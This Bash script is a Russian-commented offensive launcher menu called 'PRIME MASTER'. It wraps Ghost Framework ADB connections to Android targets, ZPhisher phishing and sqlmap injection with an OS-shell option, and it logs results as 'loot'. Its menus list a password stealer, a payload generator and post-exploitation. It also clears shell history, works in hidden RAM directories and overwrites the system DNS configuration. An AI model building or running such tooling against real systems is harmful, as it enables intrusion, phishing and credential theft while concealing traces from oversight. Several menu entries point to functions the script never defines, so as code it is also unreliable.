#!/bin/bash
# --- PRIME MASTER LAUNCHER v35.0m1 ---
CURRENT_VERSION="35.1"
G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
set +o history

# --- Инициализация системы ---
# Очистка кэша терминала для стабильной работы
if [ -f "/root/.cache/zcompdump*" ] || [ -f "/root/.zcompdump*" ]; then
    rm -f /root/.cache/zcompdump* 2>/dev/null
    rm -f /root/.zcompdump* 2>/dev/null
fi

CURRENT_IP=$(ip route get 1 2>/dev/null | awk '{print $7}')
[ -z "$CURRENT_IP" ] && CURRENT_IP="127.0.0.1"

# Настройка DNS для локальных сервисов (например, scanclamavlocal)
if command -v dnsmasq >/dev/null 2>&1; then
    cat << EOD > /etc/dnsmasq.conf
domain-needed
bogus-priv
interface=lo
interface=wlan0
address=/scanclamavlocal/$CURRENT_IP
EOD
    service dnsmasq restart 2>/dev/null || (killall dnsmasq 2>/dev/null && dnsmasq -C /etc/dnsmasq.conf 2>/dev/null)
fi

# --- Вспомогательные функции ---
get_stats() {
    local ram=$(free -m | awk '/Mem:/ {print $3 "/" $2 "MB"}')
    echo -e "${B}IP: ${W}$CURRENT_IP ${G}| ${B}RAM: ${W}$ram${NC}"
}

pause() { echo -e "\n${Y}Press Enter to return...${NC}"; read -r _; }

exit_script() { 
    echo -e "${R}Cleaning history and exiting...${NC}"
    history -c
    exit 0 
}

# --- Универсальный динамический контроллер ---
prime_dynamic_controller() {
    local title="$1"
    local -a labels=($2)
    local -a actions=($3)
    
    while true; do
        clear
        echo -e "${R}========== [ $title ] ==========${NC}"
        get_stats
        echo -e "---------------------------------------"
        
        for ((i=0; i<${#labels[@]}; i++)); do
            printf "${G}%2d) %-18s${NC}" "$((i+1))" "${labels[$i]//_/ }"
            if (( (i+1) % 2 == 0 )); then echo ""; fi
        done
        
        # Если количество элементов нечетное, добавляем перенос строки перед BACK
        if (( ${#labels[@]} % 2 != 0 )); then echo ""; fi
        
        echo -e "\n${Y} B) BACK / EXIT${NC}"
        echo -e "---------------------------------------"
        
        read -p ">> " choice
        if [[ "$choice" == "b" ]] || [[ "$choice" == "B" ]]; then return 0; fi
        
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#labels[@]}" ]; then
            local idx=$((choice-1))
            ${actions[$idx]}
        else
            echo -e "${R}[!] Ошибка: выберите 1-${#labels[@]} или B${NC}"; sleep 1
        fi
    done
}

print_header() {
    local title="$1"
    clear
    echo -e "${R}--------------------------------------------------${NC}"
    # Центрируем текст: 46 символов свободного места в рамке
    # Используем printf для выравнивания
    printf "${R}|%*s%s%*s|${NC}\n" $(((48-${#title})/2)) "" "$title" $(((49-${#title})/2)) ""
    echo -e "${R}--------------------------------------------------${NC}"
}

# Типы: i (info), s (success), e (error), w (warning)
print_status() {
    local type="$1"
    local msg="$2"
    case "$type" in
        "i") echo -e "${B}[*] ${NC}$msg" ;;
        "s") echo -e "${G}[+] ${NC}$msg" ;;
        "e") echo -e "${R}[!] ${NC}$msg" ;;
        "w") echo -e "${Y}[?] ${NC}$msg" ;;
        *) echo -e "$msg" ;;
    esac
}

log_loot() {
    local module="$1"
    local data="$2"
    local file="/root/prime_loot/${module}_results.txt"
    echo "[$(date +%T)] $data" >> "$file"
}

# Аргументы: $1 - тип проверки (cmd, file, port, dir), $2 - цель, $3 - текст ошибки
check_step() {
    local type="$1"
    local target="$2"
    local err_msg="$3"
    local status=1

    case "$type" in
        "cmd") command -v "$target" >/dev/null 2>&1 && status=0 ;;
        "file") [[ -f "$target" ]] && status=0 ;;
        "dir")  [[ -d "$target" ]] && status=0 ;;
        "port") timeout 1 bash -c "cat < /dev/tcp/${target/:/ }" 2>/dev/null && status=0 ;;
    esac

    if [[ $status -ne 0 ]]; then
        print_status "e" "$err_msg"
        return 1
    fi
    return 0
}



# --- Конец  Модулей ---
# --- ГЛАВНОЕ МЕНЮ ---
run_main_menu() {
    local main_names="GHOST_COMMANDER SOCIAL_ENG SQLMAP DEVICE_HACK EXPLOIT_HUB TOTAL_OSINT IBAN_SCAN PWD_GEN CERT_FORGE CERT_READER NET_SCAN_v2 ULTIMATE_EXPLOIT PC_RECOVERY VIEW_LOOT SYSTEM_INFO SERVICE_HUB REPAIR UPDATE_CORE EXIT"
    local main_funcs="run_ghost_commander run_phishing run_sqlmap run_device_hack run_exploit_hub run_smart_osint_engine run_iban_scan run_pwd_gen run_cert_forge run_cert_reader run_heuristic_scanner_v2 run_prime_exploiter_v4 run_pc_recovery_ultimate run_view_loot run_system_info run_servers run_repair update_prime exit_script"
    
    prime_dynamic_controller "PRIME MASTER v$CURRENT_VERSION" "$main_names" "$main_funcs"
}

# --- Точка входа ---
#repair
run_main_menu


# --- Модули: DEVICE & NETWORK ---
run_device_hack() {
    local dh_names="Ghost_Manual TShark_Sniffer Ghost_Auto-Pwn Search_ExploitDB Smart_Audit Bluetooth_Scan"
    local dh_funcs="launch_ghost_manual analyze_network_traffic launch_ghost_autopwn search_exploit_db run_deep_audit scan_bluetooth_devices"
    prime_dynamic_controller "DEVICE & NETWORK HACK" "$dh_names" "$dh_funcs"
}

analyze_network_traffic() {
    local n_names="Host_Monitor HTTP/DNS_Sniffer Traffic_Record"
    local n_funcs="run_host_monitor run_http_dns_sniffer run_traffic_record"
    prime_dynamic_controller "TSHARK ANALYZER" "$n_names" "$n_funcs"
}

# --- Модули: RECOVERY & PASSWORDS ---
pc_password_recovery() {
    local p_names="Extract_Reset_OS_Password Heuristic_Scan"
    local p_funcs="run_pc_recovery_ultimate smart_threat_scan"
    prime_dynamic_controller "PC RECOVERY & FORENSIC" "$p_names" "$p_funcs"
}

# --- EXPLOIT HUB ---
run_exploit_hub() {
    local ex_names="PhoneSploit_Pro SQLmap/Web PC/Network_Scan PC_Control"
    local ex_funcs="ex_phonesploit_pro run_sqlmap_smart ex_pc_network_scan run_pc_control"
    prime_dynamic_controller "EXPLOIT HUB" "$ex_names" "$ex_funcs"
}

run_pc_control() {
    local pc_names="Payload_Generator Password_Stealer Post-Exploit"
    local pc_funcs="pc_gen_payload pc_steal_creds pc_post_exploit"
    prime_dynamic_controller "PC CONTROL" "$pc_names" "$pc_funcs"
}

# --- SECURITY & DATA HUB ---
run_servers() {
    local s_names="AV-Scanner Share-File Upload-Inbound"
    local s_funcs="run_av_srv run_share_srv run_upload_srv"
    prime_dynamic_controller "SECURITY & DATA HUB" "$s_names" "$s_funcs"
}


# --- Модули по меню ---
run_ghost_commander() {
    # Использование унифицированной шапки
    print_header "GHOST COMMANDER (ANDROID/IOT)"

    # Эвристический поиск пути
    local GHOST_PATH=$(find /root /home /opt -maxdepth 2 -type d -name "Ghost" 2>/dev/null | head -n1)
    
    if [[ -z "$GHOST_PATH" ]]; then
        print_status "e" "Ghost Framework not found in system paths."
        pause; return
    fi

    echo -en "${Y}Enter Target IP ${W}(Leave empty for Manual Console)${Y}: ${NC}"
    read -r TARGET_IP

    if [[ -z "$TARGET_IP" ]]; then
        print_status "i" "Launching Manual Ghost Console..."
        # Изолированный запуск в суб-оболочке
        (cd "$GHOST_PATH" && python3 -m ghost)
    else
        print_status "i" "Pre-scanning target $TARGET_IP:5555..."
        
        # Эвристическая проверка порта через файловый дескриптор (без nmap)
        if ! timeout 2 bash -c "cat < /dev/tcp/$TARGET_IP/5555" 2>/dev/null; then
            print_status "w" "Target port 5555 (ADB) is closed or filtered."
            echo -en "${Y}Proceed with forced connection? (y/n): ${NC}"
            read -r yn
            [[ "$yn" != "y" ]] && return
        fi

        print_status "s" "Executing Auto-Connect to $TARGET_IP..."
        
        # Логируем попытку подключения в loot
        log_loot "ghost" "Attempting connection to $TARGET_IP"
        
        # Запуск с передачей команды напрямую в движок
        (cd "$GHOST_PATH" && python3 -m ghost --execute "connect $TARGET_IP")
    fi

    pause
}


run_phishing() {
    print_header "SOCIAL ENGINEERING HUB"

    # Ищем путь
    local Z_PATH=$(find /root /home /opt -maxdepth 2 -type d -name "zphisher" 2>/dev/null | head -n1)

    # Проверяем всё одной цепочкой. Если хоть один шаг вернет 1, выполнение остановится.
    check_step "dir" "$Z_PATH" "ZPhisher not found." || { pause; return; }
    check_step "cmd" "php" "PHP is required but not installed." || { pause; return; }

    print_status "s" "All checks passed. Launching..."
    ( cd "$Z_PATH" && ./zphisher.sh )
    pause
}


run_sqlmap() {
    # 1. Унифицированная шапка
    print_header "SMART SQL INJECTION (SQLMAP)"

    echo -en "${Y}Enter Target URL: ${NC}"
    read -r target_url
    [[ -z "$target_url" ]] && return

    # 2. Выбор агрессивности через эвристические пресеты
    print_status "w" "Select Aggression Level:"
    echo -e " 1) Stealth  ${W}(L1, R1)${NC} - Default"
    echo -e " 2) Advanced ${W}(L3, R2, T5)${NC}"
    echo -e " 3) Insane   ${W}(L5, R3, T10)${NC}"
    echo -en "${Y}>> ${NC}"
    read -r opt

    local args="--batch --random-agent --dbms=auto --shell"
    
    case "$opt" in
        2) args="$args --level 3 --risk 2 --threads 5" ;;
        3) args="$args --level 5 --risk 3 --threads 10 --flush-session" ;;
        *) args="$args --level 1 --risk 1" ;;
    esac

    # 3. Стелс-настройка: работа в RAM (/dev/shm)
    local tmp_dir="/dev/shm/.p_sql_$RANDOM"
    mkdir -p "$tmp_dir"

    print_status "i" "Launching SQLmap Engine..."
    print_status "i" "Mode: $args"

    # Запуск процесса
    sqlmap -u "$target_url" $args --output-dir="$tmp_dir" --answers="quit=N,follow=Y"

    # 4. Анализ результата и сохранение "лута"
    if [[ -d "$tmp_dir" ]]; then
        # Ищем файл лога, где sqlmap подтверждает инъекцию
        local log_file=$(find "$tmp_dir" -name "log" -type f 2>/dev/null)
        
        if [[ -n "$log_file" && -s "$log_file" ]]; then
            print_status "s" "VULNERABILITY CONFIRMED!"
            local summary=$(grep -E "Target|Payload|Type" "$log_file" | tail -n 5)
            
            # Сохраняем в общий лог лута
            log_loot "sqlmap" "SUCCESS: $target_url | Data: $summary"
            
            # Дублируем в специальный файл успешных инъекций
            echo -e "--- [ $(date) ] ---\nURL: $target_url\n$summary\n" >> /root/prime_loot/sql_success.txt
            
            print_status "s" "Report saved to: /root/prime_loot/sql_success.txt"
        else
            print_status "e" "No injection points found or target is protected."
        fi
        
        # 5. Мгновенная зачистка следов в RAM
        rm -rf "$tmp_dir"
        print_status "i" "RAM session cleared."
    fi

    pause
}


